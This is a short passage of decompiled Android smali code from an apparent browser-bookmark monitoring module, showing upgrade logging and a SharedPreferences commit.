    const-string v3, "update(): from the previous module: bookmark_ATTRIBUTE_MAX_BOOKMARK_ID_2: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, p1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 239
    :cond_6
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    if-eqz v0, :cond_7

    const-string p1, "BrowserBookmarkMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 171
    invoke-interface {v0, p1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_7
    return v1
.end method
